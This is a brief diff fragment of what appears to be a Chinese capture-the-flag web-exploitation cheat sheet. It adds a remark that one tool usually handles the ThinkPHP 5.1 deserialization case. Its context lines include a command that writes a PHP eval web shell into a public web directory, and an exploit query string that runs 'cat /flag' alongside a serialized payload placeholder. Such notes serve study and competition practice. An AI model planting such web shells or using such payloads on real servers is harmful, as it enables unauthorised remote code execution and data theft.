@@ -104,6 +104,7 @@ echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
 ^
 
 ## **Tinkphp 5.1反序列化**
+一般工具一把梭
 入口
 ```
 ?&lin=cat /flag&data=序列化串
